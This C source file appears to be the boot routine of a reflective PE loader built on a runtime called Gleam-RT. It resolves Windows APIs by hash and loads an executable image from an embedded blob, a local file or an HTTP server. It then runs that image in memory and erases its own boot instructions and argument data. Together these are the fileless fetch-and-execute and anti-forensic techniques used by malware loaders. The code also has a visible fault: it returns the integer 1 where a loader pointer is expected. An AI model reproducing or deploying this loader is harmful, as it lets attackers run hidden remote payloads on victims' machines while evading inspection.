#include "c_types.h"
#include "win_types.h"
#include "lib_memory.h"
#include "rel_addr.h"
#include "errno.h"
#include "runtime.h"
#include "pe_loader.h"
#include "boot.h"

static errno loadOption(Runtime_Opts* options);
static errno loadConfig(Runtime_M* runtime, PELoader_Cfg* config);
static void* loadImage(Runtime_M* runtime, byte* config, uint32 size);
static errno eraseArguments(Runtime_M* runtime);

static void* loadImageFromEmbed(Runtime_M* runtime, byte* config);
static void* loadImageFromFile(Runtime_M* runtime, byte* config);
static void* loadImageFromHTTP(Runtime_M* runtime, byte* config);

PELoader_M* Boot()
{
    // initialize Gleam-RT for PE Loader
    Runtime_Opts options = {
        .BootInstAddress     = GetFuncAddr(&Boot),
        .NotEraseInstruction = false,
        .NotAdjustProtect    = false,
        .TrackCurrentThread  = false,
    };
    errno elo = loadOption(&options);
    if (elo != NO_ERROR)
    {
        SetLastErrno(elo);
        return NULL;
    }
    Runtime_M* runtime = InitRuntime(&options);
    if (runtime == NULL)
    {
        return NULL;
    }

    // load config and initialize PE Loader
    PELoader_Cfg config = {
        .FindAPI = runtime->HashAPI.FindAPI,

        .Image        = NULL,
        .CommandLineA = NULL,
        .CommandLineW = NULL,
        .WaitMain     = false,
        .AllowSkipDLL = false,
        .StdInput     = NULL,
        .StdOutput    = NULL,
        .StdError     = NULL,

        .NotEraseInstruction = options.NotEraseInstruction,
        .NotAdjustProtect    = options.NotAdjustProtect,
    };
    PELoader_M* loader = NULL;
    errno err = NO_ERROR;
    for (;;)
    {
        err = loadConfig(runtime, &config);
        if (err != NO_ERROR)
        {
            break;
        }
        loader = InitPELoader(runtime, &config);
        if (loader == NULL)
        {
            err = GetLastErrno();
            break;
        }
        runtime->Memory.Free(config.Image);
        err = eraseArguments(runtime);
        if (err != NO_ERROR)
        {
            break;
        }
        break;
    }
    if (err != NO_ERROR || loader == NULL)
    {
        runtime->Core.Exit();
        SetLastErrno(err);
        return NULL;
    }

    // execute PE image
    err = loader->Execute();
    if (!config.WaitMain)
    {
        SetLastErrno(err);
        return loader;
    }
    // destroy pe loader
    errno eld = loader->Destroy();
    if (eld != NO_ERROR && err == NO_ERROR)
    {
        err = eld;
    }
    SetLastErrno(err);
    return 1;
}

__declspec(noinline)
static errno loadOption(Runtime_Opts* options)
{
    uintptr stub = (uintptr)(GetFuncAddr(&Argument_Stub));
    stub -= OPTION_STUB_SIZE;
    // check runtime option stub is valid
    if (*(byte*)stub != OPTION_STUB_MAGIC)
    {
        return ERR_INVALID_OPTION_STUB;
    }
    // load runtime options from stub
    options->NotEraseInstruction = *(bool*)(stub+OPT_OFFSET_NOT_ERASE_INSTRUCTION);
    options->NotAdjustProtect    = *(bool*)(stub+OPT_OFFSET_NOT_ADJUST_PROTECT);
    options->TrackCurrentThread  = *(bool*)(stub+OPT_OFFSET_NOT_TRACK_CURRENT_THREAD);
    return NO_ERROR;
}

__declspec(noinline)
static errno loadConfig(Runtime_M* runtime, PELoader_Cfg* config)
{
    // load PE Image, it cannot be empty
    uint32 size;
    if (!runtime->Argument.GetPointer(ARG_ID_PE_IMAGE, &config->Image, &size))
    {
        return ERR_NOT_FOUND_PE_IMAGE;
    }
    if (size == 0)
    {
        return ERR_EMPTY_PE_IMAGE_DATA;
    }
    void* image = loadImage(runtime, config->Image, size);
    if (image == NULL)
    {
        return GetLastErrno();
    }
    config->Image = image;
    // load command line ANSI, it can be empty
    if (!runtime->Argument.GetPointer(ARG_ID_CMDLINE_A, &config->CommandLineA, NULL))
    {
        return ERR_NOT_FOUND_CMDLINE_A;
    }
    // load command line Unicode, it can be empty
    if (!runtime->Argument.GetPointer(ARG_ID_CMDLINE_W, &config->CommandLineW, NULL))
    {
        return ERR_NOT_FOUND_CMDLINE_W;
    }
    // load WaitMain, it must be true of false
    if (!runtime->Argument.GetValue(ARG_ID_WAIT_MAIN, &config->WaitMain, &size))
    {
        return ERR_NOT_FOUND_WAIT_MAIN;
    }
    if (size != sizeof(bool))
    {
        return ERR_INVALID_WAIT_MAIN;
    }
    // load AllowSkipDLL, it must be true of false
    if (!runtime->Argument.GetValue(ARG_ID_ALLOW_SKIP_DLL, &config->AllowSkipDLL, &size))
    {
        return ERR_NOT_FOUND_ALLOW_SKIP_DLL;
    }
    if (size != sizeof(bool))
    {
        return ERR_INVALID_ALLOW_SKIP_DLL;
    }
    // load STD_INPUT_HANDLE, it can be zero
    if (!runtime->Argument.GetValue(ARG_ID_STD_INPUT, &config->StdInput, &size))
    {
        return ERR_NOT_FOUND_STD_INPUT;
    }
    if (size != sizeof(HANDLE))
    {
        return ERR_INVALID_STD_INPUT;
    }
    // load STD_OUTPUT_HANDLE, it can be zero
    if (!runtime->Argument.GetValue(ARG_ID_STD_OUTPUT, &config->StdOutput, &size))
    {
        return ERR_NOT_FOUND_STD_OUTPUT;
    }
    if (size != sizeof(HANDLE))
    {
        return ERR_INVALID_STD_OUTPUT;
    }
    // load STD_ERROR_HANDLE, it can be zero
    if (!runtime->Argument.GetValue(ARG_ID_STD_ERROR, &config->StdError, &size))
    {
        return ERR_NOT_FOUND_STD_ERROR;
    }
    if (size != sizeof(HANDLE))
    {
        return ERR_INVALID_STD_ERROR;
    }
    return NO_ERROR;
}

static void* loadImage(Runtime_M* runtime, byte* config, uint32 size)
{
    if (size < 1)
    {
        SetLastErrno(ERR_INVALID_IMAGE_CONFIG);
        return NULL;
    }
    byte mode = *config;
    config++;
    switch (mode)
    {
    case MODE_EMBED_IMAGE:
        return loadImageFromEmbed(runtime, config);
    case MODE_LOCAL_FILE:
        return loadImageFromFile(runtime, config);
    case MODE_HTTP_SERVER:
        return loadImageFromHTTP(runtime, config);
    default:
        SetLastErrno(ERR_INVALID_LOAD_MODE);
        return NULL;
    }
}

static void* loadImageFromEmbed(Runtime_M* runtime, byte* config)
{
    byte mode = *config;
    config++;
    switch (mode)
    {
    case EMBED_DISABLE_COMPRESS:
      {
        uint32 size = *(uint32*)config;
        void* buf = runtime->Memory.Alloc(size);
        mem_copy(buf, config + 4, size);
        return buf;
      }
    case EMBED_ENABLE_COMPRESS:
      {
        uint32 rawSize = *(uint32*)(config+0);
        uint32 comSize = *(uint32*)(config+4);
        byte*  comData = (byte*)(config+8);
        void* buf = runtime->Memory.Alloc(rawSize);
        uint size = runtime->Compressor.Decompress(buf, comData, comSize);
        if (size != (uint)rawSize)
        {
            SetLastErrno(ERR_INVALID_COMPRESS_DATA);
            return NULL;
        }
        return buf;
      }
    default:
        SetLastErrno(ERR_INVALID_EMBED_CONFIG);
        return NULL;
    }
}

static void* loadImageFromFile(Runtime_M* runtime, byte* config)
{
    databuf file;
    errno errno = runtime->WinFile.ReadFileW((LPWSTR)config, &file);
    if (errno != NO_ERROR)
    {
        SetLastErrno(errno);
        return NULL;
    }
    if (file.len < 64)
    {
        SetLastErrno(ERR_INVALID_PE_IMAGE);
        return NULL;
    }
    return file.buf;
}

static void* loadImageFromHTTP(Runtime_M* runtime, byte* config)
{
    HTTP_Request req;
    if (!runtime->Serialization.Unserialize(config, &req))
    {
        SetLastErrno(ERR_INVALID_HTTP_CONFIG);
        return NULL;
    }
    HTTP_Response resp;
    errno errno = runtime->WinHTTP.Get(&req, &resp);
    if (errno != NO_ERROR)
    {
        SetLastErrno(errno);
        return NULL;
    }
    if (resp.StatusCode != 200)
    {
        SetLastErrno(ERR_INVALID_HTTP_STATUS_CODE);
        return NULL;   
    }
    if (resp.Body.len < 64)
    {
        SetLastErrno(ERR_INVALID_PE_IMAGE);
        return NULL;
    }
    runtime->WinHTTP.Free();
    return resp.Body.buf;
}

static errno eraseArguments(Runtime_M* runtime)
{
    uint32 id[] = 
    {
        ARG_ID_PE_IMAGE,
        ARG_ID_WAIT_MAIN,
        ARG_ID_ALLOW_SKIP_DLL,
        ARG_ID_STD_INPUT,
        ARG_ID_STD_OUTPUT,
        ARG_ID_STD_ERROR,
    };
    bool success = true;
    for (int i = 0; i < arrlen(id); i++)
    {
        if (!runtime->Argument.Erase(id[i]))
        {
            success = false;   
        }
    }
    if (success)
    {
        return NO_ERROR;
    }
    return ERR_ERASE_ARGUMENTS;
}
